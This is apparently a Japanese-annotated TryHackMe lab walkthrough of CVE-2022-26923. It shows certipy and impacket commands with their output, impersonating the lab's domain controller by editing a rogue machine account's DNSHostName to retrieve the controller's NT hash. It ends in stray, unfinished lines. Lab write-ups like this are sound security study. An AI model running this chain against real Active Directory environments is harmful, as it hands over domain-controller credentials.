# CVE-2022-26923 (Try Hack Me) 

Walkthrough on the exploitation of CVE-2022-26923, a vulnerability in AD Certificate Services.

https://tryhackme.com/room/cve202226923

# target info

```powershell
PS C:\Users\thm> Get-NetDomain
 
 Forest                  : lunar.eruca.com
 DomainControllers       : {LUNDC.lunar.eruca.com}
 Children                : {}
 DomainMode              : Windows2012R2Domain
 DomainModeLevel         : 6
 Parent                  :
 PdcRoleOwner            : LUNDC.lunar.eruca.com
 RidRoleOwner            : LUNDC.lunar.eruca.com
 InfrastructureRoleOwner : LUNDC.lunar.eruca.com
 Name                    : lunar.eruca.com
 
 PS C:\Users\thm> cmd /c certutil
 Entry 0: (Local)
   Name:                         "lunar-LUNDC-CA"
   Organizational Unit:          ""
   Organization:                 ""
   Locality:                     ""
   Country/region:               ""
   Config:                       "LUNDC.lunar.eruca.com\lunar-LUNDC-CA"
   Exchange Certificate:         ""
   Signature Certificate:        "LUNDC.lunar.eruca.com_lunar-LUNDC-CA.crt"
   Description:                  ""
   Server:                       "LUNDC.lunar.eruca.com"  Authority:                    "lunar-LUNDC-CA"
   Sanitized Name:               "lunar-LUNDC-CA"  Short Name:                   "lunar-LUNDC-CA"
   Sanitized Short Name:         "lunar-LUNDC-CA"
   
   PS C:\Users\thm> Get-DomainController | select name   
   Name                  
   ----                  
   LUNDC.lunar.eruca.com  
   
   PS C:\Users\thm> Get-DomainComputer | select name 
   
   name          
   ----              
   LUNDC             
   LUNWRK045         
   LUNWRK046         
   LUNIISQA01        
   LUNDBSQLQA01      
   LUNIISPRD01       
   LUNDBSQLPRD01     
   LUNJENKINSS2
```

# Exploit

```bash
┌──(shoebill㉿shoebill)-[~/TryHackMe]
└─$ sudo certipy req -ca LUNAR-LUNDC-CA -template User -dc-ip 10.10.219.213 -u thm@lunar.eruca.com -p 'Password1@'
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
 [*] Successfully requested certificate
 [*] Request ID is 14
 [*] Got certificate with UPN 'thm@lunar.eruca.com'
 [*] Certificate has no object SID
 [*] Saved certificate and private key to 'thm.pfx'
```

pfxファイルが正しく作成されていることを確認

```bash
┌──(shoebill㉿shoebill)-[~/TryHackMe]
└─$ certipy auth -pfx thm.pfx 
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Using principal: thm@lunar.eruca.com
 [*] Trying to get TGT...
 [*] Got TGT
 [*] Saved credential cache to 'thm.ccache'
 [*] Trying to retrieve NT hash for 'thm'
 [*] Got hash for 'thm@lunar.eruca.com': aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a
``` 

ターゲットドメインに新たなコンピュータを追加

```bash
 ┌──(shoebill㉿shoebill)-[~/TryHackMe]
 └─$ impacket-addcomputer 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@'
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [*] Successfully added machine account THMPC$ with password Password1@.
```

このコンピュータのpfxが取れるか？そして正しいか確認

```bash
┌──(shoebill㉿shoebill)-[~/TryHackMe]
└─$ certipy req -ca LUNAR-LUNDC-CA -template Machine -dc-ip 10.10.219.213 -u 'THMPC$@lunar.eruca.com' -p 'Password1@'
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
 [*] Successfully requested certificate
 [*] Request ID is 17
 [*] Got certificate with DNS Host Name 'THMPC.lunar.eruca.com'
 [*] Certificate has no object SID
 [*] Saved certificate and private key to 'thmpc.pfx'
```

`-u 'THMPC$@lunar.eruca.com'`のように指定しないと`Got error: rpc_s_access_denied`とエラーが出る。

```bash
┌──(shoebill㉿shoebill)-[~/TryHackMe]
└─$ certipy auth -pfx thmpc.pfx                                                                                      
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Using principal: thmpc$@lunar.eruca.com
 [*] Trying to get TGT...
 [*] Got TGT
 [*] Saved credential cache to 'thmpc.ccache'
 [*] Trying to retrieve NT hash for 'thmpc$'
 [*] Got hash for 'thmpc$@lunar.eruca.com': aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a
```

ターゲット上で操作する
```bash
 ┌──(shoebill㉿shoebill)-[~]
 └─$ ssh thm@10.10.219.213 
```

新たに追加したTCMPCのDNSHostNameを"LUNDC.lunar.eruca.com"にしたい。

そのためには、まず先にServicePrinticpalNameをクリアする必要がある：

```powershell
 PS C:\Users\thm> Set-ADComputer THMPC -ServicePrincipalName @{}
 PS C:\Users\thm> Set-ADComputer THMPC -DNSHostName LUNDC.lunar.eruca.com
 PS C:\Users\thm> Get-ADComputer THMPC -properties dnshostname,serviceprincipalname
 
 DistinguishedName : CN=THMPC,CN=Computers,DC=lunar,DC=eruca,DC=com
 DNSHostName       : LUNDC.lunar.eruca.com
 Enabled           : True
 Name              : THMPC
 ObjectClass       : computer
 ObjectGUID        : 630dcc70-50ab-480c-9055-f688d9e0b960
 SamAccountName    : THMPC$
 SID               : S-1-5-21-3330634377-1326264276-632209373-11217
``` 

Domain Controllerのpfxを取得

```powershell
 ┌──(shoebill㉿shoebill)-[~/TryHackMe]
 └─$ certipy req -ca LUNAR-LUNDC-CA -template Machine -dc-ip 10.10.219.213 -u 'THMPC$@lunar.eruca.com' -p 'Password1@'
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
 [*] Successfully requested certificate
 [*] Request ID is 18
 [*] Got certificate with DNS Host Name 'LUNDC.lunar.eruca.com'
 [*] Certificate has no object SID
 [*] Saved certificate and private key to 'lundc.pfx'
```

得られたのは、「THMPC.lunar.eruca.com」ではなく「LUNDC.lunar.eruca.com」となっていることに注目。

Domain Controllerのハッシュを得る：

```bash
 ┌──(shoebill㉿shoebill)-[~/TryHackMe]
 └─$ certipy auth -pfx lundc.pfx                                                                                      
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Using principal: lundc$@lunar.eruca.com
 [*] Trying to get TGT...
 [*] Got TGT
 [*] Saved credential cache to 'lundc.ccache'
 [*] Trying to retrieve NT hash for 'lundc$'
 [*] Got hash for 'lundc$@lunar.eruca.com': aad3b435b51404eeaad3b435b51404ee:14fc9b5814def64289bb694f6659c733
``` 

Domain Controllerのハッシュを
┌──(shoebill㉿shoebill)-[~/TryHackMe]はっs
┌──(shoebill㉿shoebill)-[~/TryHackMe]
